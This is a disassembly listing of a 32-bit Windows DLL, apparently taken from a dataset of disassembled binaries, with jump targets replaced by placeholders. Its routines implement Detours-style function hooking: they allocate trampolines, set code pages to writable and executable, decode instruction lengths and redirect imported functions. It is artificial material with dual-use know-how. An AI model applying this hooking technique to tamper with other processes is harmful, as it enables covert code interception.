pop eax
retn
cmp al 0xe0
je r-xdata
cmp al 0xc2
je r-xdata
cmp al 0xc3
je r-xdata
cmp al 0xcc
je r-xdata
cmp al 0xff
jne r-xdata
cmp al 0x26
je r-xdata
cmp [ ecx + 0x1 ] 0x25
je r-xdata
cmp [ ecx + 0x1 ] 0xff
jne r-xdata
cmp al 0x2e
je r-xdata
xor eax eax
retn
cmp [ ecx + 0x2 ] 0x25
je r-xdata
cmp al 0x36
je r-xdata
cmp al 0xe3
je r-xdata
cmp al 0x64
je r-xdata
cmp al 0x65
jne r-xdata
sub_100032f4
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp esi 0x7ff80000
mov ebx 0x10000
jbe r-xdata
mov [ ebp + 0x8 ] ebx
lea eax [ esi - 0x7ff80000 ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfff80000
lea eax [ esi + 0x7ff80000 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp esi 0x80000000
jae r-xdata
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
test eax eax
jne r-xdata
mov eax ecx
test ecx ecx
mov [ rw-data ] eax
je r-xdata
cmp edx [ ebp + 0x8 ]
jb r-xdata
mov eax ecx
mov [ rw-data ] eax
mov eax esi
and eax 0xffff
sub esi eax
cmp esi [ ebp + 0x8 ]
mov edi esi
jbe r-xdata
test eax eax
je r-xdata
cmp edx [ ebp - 0x4 ]
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jae r-xdata
cmp edi 0x70000000
jb r-xdata
mov eax [ eax + 0x4 ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ebp + 0x8 ]
jb r-xdata
xor eax eax
cmp esi 0x70000000
jb r-xdata
lea eax [ ebp - 0x20 ]
push 0x1c
push eax
push edi
call [ VirtualQuery@IAT ]
test eax eax
je r-xdata
cmp edi 0x80000000
ja r-xdata
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
ja r-xdata
lea eax [ ebp - 0x20 ]
push 0x1c
push eax
push esi
call [ VirtualQuery@IAT ]
test eax eax
je r-xdata
cmp esi 0x80000000
ja r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
mov edi 0x6fff0000
cmp ecx [ ebp - 0x4 ]
jbe r-xdata
mov ecx [ esi + 0x18 ]
push 0x20
push 0xcc
push esi
mov [ eax + 0x8 ] ecx
call memset
add esp 0xc
mov eax esi
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
mov esi 0x80010000
mov eax [ ebp - 0x1c ]
lea edi [ eax - 0x10000 ]
cmp edi [ ebp + 0x8 ]
ja r-xdata
cmp [ ebp - 0x14 ] ebx
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x14 ]
lea esi [ eax + ecx ]
jmp r-xdata
cmp [ ebp - 0x14 ] ebx
jb r-xdata
jmp r-xdata
push 0x40
push 0x3000
push ebx
push edi
call [ VirtualAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx esi
and ecx 0xffff
je r-xdata
mov [ eax ] 0x52727464
mov eax [ rw-data ]
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
mov [ rw-data ] eax
add eax 0xffe0
mov edx 0x7fd
push 0x40
push 0x3000
push ebx
push esi
call [ VirtualAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov eax ebx
sub eax ecx
sub [ ebp - 0x14 ] eax
add [ ebp - 0x20 ] eax
mov esi [ ebp - 0x20 ]
mov [ eax + 0x18 ] ecx
mov ecx eax
sub eax 0x20
dec edx
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x8 ] ecx
mov eax [ rw-data ]
sub_100034eb
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
push 0x1c
lea eax [ ebp - 0x38 ]
push eax
push [ ebp + 0x8 ]
call [ VirtualQuery@IAT ]
test eax eax
je r-xdata
xor eax eax
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x34 ]
cmp [ ecx ] 0x5a4d
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ecx + 0x3c ]
add eax ecx
mov [ ebp - 0x3c ] eax
cmp [ eax ] 0x4550
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax ecx
jmp r-xdata
xor eax eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10003571
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
call [ GetCurrentThreadId@IAT ]
cmp [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax 0x10dd
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
push 0x6
pop eax
jmp r-xdata
push 0x18
call ??2@YAPAXI@Z
mov esi eax
pop ecx
test esi esi
jne r-xdata
push 0x6
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov edi [ edi ]
push 0x0
push [ ebp + 0xc ]
call sub_10002b06
movzx ecx [ edi + 0x17 ]
mov ebx [ edi + 0x18 ]
xor edx edx
sub ebx ecx
cmp ecx edx
je r-xdata
push 0x8
pop edi
jmp r-xdata
mov [ rw-data ] edi
cmp [ rw-data ] edx
push 0x9
pop edi
jne r-xdata
cmp ecx 0x17
ja r-xdata
mov [ rw-data ] edi
test esi esi
je r-xdata
cmp [ edi + 0x1c ] eax
jne r-xdata
mov eax edi
mov edi [ ebp + 0x8 ]
push esi
call ??3@YAXPAX@Z
pop ecx
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edx
push eax
push 0x40
push ecx
push ebx
call [ VirtualProtect@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] edi
mov [ esi + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ esi + 0x14 ] eax
mov eax [ rw-data ]
mov [ esi ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
sub_1000366d
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
xor eax eax
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
pop edi
pop ebx
leave
retn
push 0x24
mov ebx rw-data
push edi
push ebx
call memset
add esp 0xc
call [ GetCurrentProcess@IAT ]
push rw-data
mov [ rw-data ] eax
call [ LoadLibraryA@IAT ]
cmp eax edi
mov [ rw-data ] eax
je r-xdata
cmp eax edi
mov [ rw-data ] 0x1
je r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push rw-data
push eax
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
push rw-data
mov [ rw-data ] eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
push 0x8
lea eax [ ebp - 0x8 ]
push edi
push eax
call memset
mov eax [ rw-data ]
add esp 0xc
cmp eax edi
mov [ ebp - 0x8 ] 0x7
pop esi
je r-xdata
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
push eax
call [ FreeLibrary@IAT ]
mov eax [ rw-data ]
cmp [ rw-data ] edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
call eax
cmp [ ebp - 0x8 ] 0x7
jb r-xdata
push edi
push edi
push [ rw-data ]
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
mov [ rw-data ] ebx
mov eax ebx
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
call eax
and al 0xfc
or al 0x4
push eax
call [ rw-data ]
sub_10003813
push ebp
mov ebp esp
sub esp 0x65c
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call [ LoadLibraryA@IAT ]
mov edi eax
xor ebx ebx
cmp edi ebx
jne r-xdata
push [ ebp + 0xc ]
push edi
call [ GetProcAddress@IAT ]
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
call sub_1000366d
mov esi eax
cmp esi ebx
je r-xdata
mov eax edi
push ebx
cdq
push edx
push eax
push ebx
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edx
push ebx
push [ esi ]
call [ esi + 0x18 ]
mov edi 0x23c
lea eax [ ebp - 0x65c ]
push edi
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x65c ]
mov [ ebp - 0x65c ] edi
push eax
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ esi ]
call [ esi + 0x1c ]
test eax eax
je r-xdata
add edi 0xffffffc4
lea ecx [ ebp - 0x640 ]
lea edx [ ebp - 0x208 ]
mov [ ebp + 0x8 ] edi
lea eax [ ebp - 0x208 ]
mov [ ebp - 0x4 ] ebx
sub ecx edx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov [ eax ] dl
inc eax
dec [ ebp + 0x8 ]
jne r-xdata
cmp [ ebp - 0x4 ] ebx
mov [ eax ] bl
jl r-xdata
dec eax
mov [ ebp - 0x4 ] 0x57
mov dl [ ecx + eax ]
cmp dl bl
je r-xdata
push rw-data
lea eax [ ebp - 0x208 ]
push edi
push eax
call sub_10003961
add esp 0xc
test eax eax
jl r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x208 ]
push edi
push eax
call sub_10003961
add esp 0xc
test eax eax
jl r-xdata
push 0x218
lea eax [ ebp - 0x420 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x420 ]
mov [ ebp - 0x420 ] 0x18
mov [ ebp - 0x410 ] edi
push eax
lea eax [ ebp - 0x208 ]
push eax
push [ esi ]
call [ esi + 0x20 ]
neg eax
sbb eax eax
and eax [ ebp - 0x41c ]
sub_10003961
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
cmp esi 0x7fffffff
jbe r-xdata
lea eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
push eax
push esi
push edi
call sub_100039a3
add esp 0xc
test eax eax
jl r-xdata
push 0x57
pop eax
jmp r-xdata
pop edi
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
sub esi eax
add eax edi
push esi
push eax
call sub_100039df
add esp 0xc
pop esi
pop ebp
retn
sub_100039a3
push esi
mov esi [ esp + 0xc ]
xor eax eax
cmp esi 0x7fffffff
mov ecx esi
jbe r-xdata
test esi esi
je r-xdata
push 0x57
pop eax
pop esi
retn
push 0x57
pop eax
mov edx [ esp + 0x8 ]
pop esi
retn
sub ecx esi
mov [ edx ] ecx
test esi esi
jne r-xdata
inc edx
dec esi
jne r-xdata
mov edx [ esp + 0x10 ]
test edx edx
je r-xdata
cmp [ edx ] 0x0
je r-xdata
sub_100039df
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
push 0x57
pop eax
pop ebp
retn
cmp [ ebp + 0xc ] 0x0
pop esi
jne r-xdata
mov [ edx ] cl
inc edx
inc esi
dec [ ebp + 0xc ]
jne r-xdata
and [ edx ] 0x0
pop ebp
retn
push 0x57
dec edx
pop eax
mov cl [ esi ]
test cl cl
je r-xdata
sub_10003a14
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
mov esi 0x10000
je r-xdata
push 0x1c
push 0x0
lea eax [ ebp - 0x38 ]
push eax
call memset
add esp 0xc
lea esi [ eax + 0x10000 ]
xor eax eax
jmp r-xdata
cmp [ ebp - 0x28 ] 0x1000
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x38 ]
lea esi [ eax + ecx ]
jmp r-xdata
test [ ebp - 0x23 ] 0x1
jne r-xdata
push 0x1c
lea eax [ ebp - 0x38 ]
push eax
push esi
call [ VirtualQuery@IAT ]
test eax eax
jbe r-xdata
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x3c ] esi
cmp [ esi ] 0x5a4d
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x3c ]
add eax esi
mov [ ebp - 0x40 ] eax
cmp [ eax ] 0x4550
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax esi
sub_10003acf
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] 0x5a4d
je r-xdata
push ebx
call [ GetModuleHandleA@IAT ]
mov edi eax
mov esi [ edi + 0x3c ]
add esi edi
mov [ ebp - 0x20 ] esi
cmp [ esi ] 0x4550
je r-xdata
push 0xc1
jmp r-xdata
cmp [ esi + 0x14 ] bx
jne r-xdata
push 0xbf
jmp r-xdata
call [ SetLastError@IAT ]
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
push ebx
call [ SetLastError@IAT ]
mov eax [ esi + 0x28 ]
add eax edi
jmp r-xdata
push 0xc0
call [ SetLastError@IAT ]
xor eax eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_10003b7f
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
xor ebx ebx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ eax ] 0x5a4d
je r-xdata
push ebx
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0x1c ] eax
mov esi [ eax + 0x3c ]
add esi eax
mov [ ebp - 0x24 ] esi
cmp [ esi ] 0x4550
je r-xdata
push 0xc1
jmp r-xdata
mov ax [ esi + 0x14 ]
cmp ax bx
jne r-xdata
push 0xbf
jmp r-xdata
call [ SetLastError@IAT ]
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
movzx eax ax
lea eax [ eax + esi + 0x18 ]
mov [ ebp - 0x20 ] eax
xor esi esi
push 0xc0
lea eax [ ebx + ebx * 4 ]
mov ecx [ ebp - 0x20 ]
lea edi [ ecx + eax * 8 ]
push rw-data
push edi
call strcmp
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
inc ebx
jmp r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ ebp - 0x28 ] ebx
movzx eax [ esi + 0x6 ]
cmp ebx eax
jae r-xdata
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov ecx [ ebp - 0x1c ]
lea esi [ eax + ecx ]
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x30 ] esi
mov eax [ esi ]
cmp eax 0x40
jb r-xdata
cmp [ esi + 0x4 ] 0x727444
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push 0x0
jmp r-xdata
mov [ esi + 0x8 ] eax
call [ SetLastError@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov eax esi
jmp r-xdata
sub_10003c9b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp edi ebx
je r-xdata
push [ ebp + 0x8 ]
call sub_10003b7f
cmp eax ebx
je r-xdata
mov [ edi ] ebx
xor eax eax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x24 ] eax
cmp [ eax ] 0x40
jb r-xdata
push 0xbf
cmp [ eax + 0x4 ] 0x727444
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0xc
mov esi [ eax + 0x8 ]
add esi eax
mov [ ebp - 0x28 ] esi
mov ecx [ eax + 0xc ]
add ecx eax
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0xc ]
push 0x6
jmp r-xdata
mov [ ebp - 0x30 ] esi
mov edx [ esi + 0x8 ]
cmp edx [ eax ]
jne r-xdata
call [ SetLastError@IAT ]
xor eax eax
add esi [ esi ]
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov dx [ esi + 0xc ]
cmp dx [ eax + 0x4 ]
jne r-xdata
cmp esi ecx
jae r-xdata
mov dx [ esi + 0xe ]
cmp dx [ eax + 0x6 ]
jne r-xdata
mov dl [ esi + 0x10 ]
cmp dl [ eax + 0x8 ]
jne r-xdata
mov dl [ esi + 0x11 ]
cmp dl [ eax + 0x9 ]
jne r-xdata
mov dl [ esi + 0x12 ]
cmp dl [ eax + 0xa ]
jne r-xdata
mov dl [ esi + 0x13 ]
cmp dl [ eax + 0xb ]
jne r-xdata
mov dl [ esi + 0x14 ]
cmp dl [ eax + 0xc ]
jne r-xdata
mov dl [ esi + 0x15 ]
cmp dl [ eax + 0xd ]
jne r-xdata
mov dl [ esi + 0x16 ]
cmp dl [ eax + 0xe ]
jne r-xdata
mov dl [ esi + 0x17 ]
cmp dl [ eax + 0xf ]
jne r-xdata
cmp edi ebx
je r-xdata
mov eax [ esi ]
sub eax 0x18
mov [ edi ] eax
push ebx
call [ SetLastError@IAT ]
lea eax [ esi + 0x18 ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_10003dcb
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
mov eax 0x150
cmp [ esi ] eax
jne r-xdata
push 0xc1
call [ SetLastError@IAT ]
xor eax eax
cmp [ ebp + 0xc ] eax
jb r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0xc ]
push edi
mov edi [ VirtualProtect@IAT ]
push eax
push 0x40
push 0x40
push [ esi + 0x4 ]
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
jmp r-xdata
lea eax [ ebp - 0x8 ]
push ebx
push eax
mov ebx 0xf8
push 0x40
push ebx
push [ esi + 0x8 ]
call edi
test eax eax
je r-xdata
pop esi
leave
retn 0x8
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
push 0x40
push [ esi + 0x4 ]
call edi
pop ebx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
lea eax [ esi + 0x14 ]
push 0x40
push eax
push [ esi + 0x4 ]
call memcpy
lea eax [ esi + 0x54 ]
push ebx
push eax
push [ esi + 0x8 ]
call memcpy
mov eax [ esi + 0xc ]
add esp 0x18
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
push ecx
push 0x40
push 0x4
push eax
call edi
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
lea ecx [ esi + 0x14c ]
push 0x4
push ecx
push eax
call memcpy
add esp 0xc
lea eax [ ebp + 0x8 ]
push eax
push [ ebp - 0x8 ]
push ebx
push [ esi + 0x8 ]
call edi
lea ecx [ ebp + 0x8 ]
push ecx
push [ ebp + 0xc ]
push 0x4
push eax
call edi
sub_10003ebc
push ebp
mov ebp esp
push ecx
push esi
push 0x0
push 0x7e
call [ SetLastError@IAT ]
xor eax eax
lea eax [ ebp - 0x4 ]
push eax
push r--data
push esi
call sub_10003c9b
test eax eax
je r-xdata
push esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_10003a14
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x4 ]
push eax
call sub_10003dcb
jmp r-xdata
pop esi
leave
retn
sub_10003f02
push ebp
mov ebp esp
sub esp 0x5c
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x5c ]
push [ ebp + 0x10 ]
call sub_10003f28
push [ ebp + 0xc ]
lea ecx [ ebp - 0x5c ]
push [ ebp + 0x8 ]
call sub_10003f5c
leave
retn 0x10
sub_10003f28
mov eax ecx
push esi
mov ecx [ esp + 0x8 ]
xor esi esi
cmp ecx esi
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
jne r-xdata
mov edx [ esp + 0xc ]
mov [ eax + 0xc ] ecx
cmp edx esi
jne r-xdata
lea ecx [ eax + 0x18 ]
mov [ eax + 0x10 ] edx
mov [ ecx ] esi
mov ecx [ eax + 0x10 ]
mov [ ecx ] esi
pop esi
retn 0x8
lea edx [ eax + 0x14 ]
sub_10003f5c
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov edx [ esp + 0xc ]
test edx edx
jne r-xdata
lea esi [ ecx + 0x1c ]
movzx eax [ edx ]
push edx
push esi
lea eax [ eax * 8 + r--data ]
push eax
call [ eax + 0x4 ]
push 0xd
call [ SetLastError@IAT ]
xor eax eax
jmp r-xdata
pop esi
retn 0x8
sub_10003f90
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0xc ] ecx
mov eax [ eax ]
test eax 0x20000000
je r-xdata
cmp [ ecx ] 0x0
cmp [ ecx + 0x4 ] 0x0
jmp r-xdata
shr esi 0x8
shr esi 0xc
jmp r-xdata
mov esi eax
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call memcpy
add esp 0xc
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x10 ]
shr eax 0x10
and eax 0xf
add eax ecx
mov cl [ eax ]
mov [ ebp - 0x1 ] cl
movzx ecx cl
mov cl [ ecx + r--data ]
mov dl cl
and edx 0xf
add edx esi
test cl 0x10
mov [ ebp - 0x8 ] edx
je r-xdata
push ebx
mov ebx eax
and esi 0xf
push edi
shl ebx 0x8
sar ebx 0x1c
mov edi esi
mov [ ebp - 0x8 ] esi
sub edi ebx
test eax 0xf0000
jbe r-xdata
mov esi [ ebp - 0xc ]
push edi
push ebx
push esi
mov esi [ ebp - 0xc ]
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
call sub_100040b8
mov ecx [ esi + 0xc ]
mov [ ecx ] eax
jmp r-xdata
mov al [ eax + 0x1 ]
and al 0x7
cmp al 0x5
jne r-xdata
test [ ecx + 0x3 ] 0x10
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ eax ]
neg edx
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
pop edi
pop ebx
test [ ecx + 0x3 ] 0x40
je r-xdata
mov edi [ ebp - 0x8 ]
sub edi ebx
mov al [ ebp - 0x1 ]
and al 0xc0
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x10 ]
add eax ecx
pop esi
leave
retn 0xc
mov eax [ esi + 0xc ]
or [ eax ] 0xffffffff
add [ ebp - 0x8 ] 0x4
cmp al 0x40
jne r-xdata
cmp al 0x80
jne r-xdata
inc [ ebp - 0x8 ]
jmp r-xdata
sub_10004083
push ebx
push esi
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x14 ]
push esi
push edi
mov ebx ecx
push [ esp + 0x18 ]
call sub_10003f90
movzx ecx [ esi + 0x1 ]
lea eax [ esi + 0x1 ]
inc edi
lea edx [ ecx * 8 + r--data ]
push eax
push edi
push edx
mov ecx ebx
call [ edx + 0x4 ]
pop edi
pop esi
pop ebx
retn 0xc
sub_100040b8
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor edx edx
push edi
lea esi [ ebx + eax ]
mov eax [ ebp + 0x18 ]
dec eax
je r-xdata
movsx edx [ esi ]
dec eax
je r-xdata
cmp edx 0xffffff80
mov [ esi ] dl
jl r-xdata
dec edi
je r-xdata
movsx edx [ esi ]
jmp r-xdata
dec eax
dec eax
je r-xdata
mov ecx [ ecx + 0x10 ]
mov [ ecx ] 0x3
cmp edx 0x7f
jle r-xdata
cmp edx 0xffff8000
mov [ esi ] dx
jl r-xdata
dec edi
dec edi
je r-xdata
mov edi [ ebp + 0xc ]
lea eax [ edx + edi ]
sub edx ebx
add eax [ ebp + 0x10 ]
add edx edi
mov edi [ ebp + 0x18 ]
dec edi
je r-xdata
mov edx [ esi ]
jmp r-xdata
sub eax 0x4
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
mov ecx [ ecx + 0x10 ]
mov [ ecx ] 0x2
jmp r-xdata
cmp edx 0x7fff
jle r-xdata
cmp edx 0x80000000
mov [ esi ] edx
jl r-xdata
sub edi 0x4
jne r-xdata
mov ecx [ ecx + 0x10 ]
and [ ecx ] 0x0
jmp r-xdata
cmp edx 0x7fffffff
jle r-xdata
mov [ esi ] edx
jmp r-xdata
sub_10004166
push ebx
push esi
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x14 ]
push esi
push edi
mov ebx ecx
push [ esp + 0x18 ]
call sub_10003f90
movzx ecx [ esi + 0x1 ]
lea eax [ esi + 0x1 ]
inc edi
lea edx [ ecx * 8 + r--data ]
push eax
push edi
push edx
mov ecx ebx
call [ edx + 0x4 ]
pop edi
pop esi
pop ebx
retn 0xc
sub_100041d0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x10 ]
test [ eax + 0x1 ] 0x38
jne r-xdata
push eax
mov [ ebp - 0x10 ] 0x122f6
push [ ebp + 0xc ]
mov [ ebp - 0xc ] sub_10003f90
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x8 ] 0x10133f6
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] sub_10003f90
lea eax [ ebp - 0x8 ]
jmp r-xdata
push eax
call sub_10003f90
leave
retn 0xc
sub_10004215
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x10 ]
test [ eax + 0x1 ] 0x38
jne r-xdata
push eax
mov [ ebp - 0x10 ] 0x122f7
push [ ebp + 0xc ]
mov [ ebp - 0xc ] sub_10003f90
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x8 ] 0x40146f7
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] sub_10003f90
lea eax [ ebp - 0x8 ]
jmp r-xdata
push eax
call sub_10003f90
leave
retn 0xc
sub_1000425a
push ebp
mov ebp esp
push ecx
push ecx
mov edx [ ebp + 0x10 ]
mov al [ edx + 0x1 ]
cmp al 0x15
je r-xdata
mov eax [ edx + 0x2 ]
push esi
mov esi [ ecx + 0xc ]
mov eax [ eax ]
mov [ esi ] eax
pop esi
cmp al 0x25
je r-xdata
and al 0x38
cmp al 0x10
je r-xdata
mov eax [ ecx + 0xc ]
or [ eax ] 0xffffffff
jmp r-xdata
cmp al 0x18
je r-xdata
push edx
lea eax [ ebp - 0x8 ]
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] 0x122ff
mov [ ebp - 0x4 ] sub_10003f90
push eax
call sub_10003f90
leave
retn 0xc
cmp al 0x20
je r-xdata
cmp al 0x28
jne r-xdata
sub_10001000
jmp r-xdata
mov eax [ Sleep@IAT ]
mov [ rw-data ] eax
retn
sub_10001010
push [ esp + 0x4 ]
call [ rw-data ]
retn 0x4
sub_100019ed
push 0x0
call exit
printf
jmp [ printf@IAT ]
exit
jmp [ exit@IAT ]
rand
jmp [ rand@IAT ]
strstr
jmp [ strstr@IAT ]
strcpy
jmp [ strcpy@IAT ]
strcat
jmp [ strcat@IAT ]
free
jmp [ free@IAT ]
malloc
jmp [ malloc@IAT ]
strncpy
jmp [ strncpy@IAT ]
_snprintf
jmp [ _snprintf@IAT ]
strlen
jmp [ strlen@IAT ]
sprintf
jmp [ sprintf@IAT ]
_sleep
jmp [ _sleep@IAT ]
atoi
jmp [ atoi@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
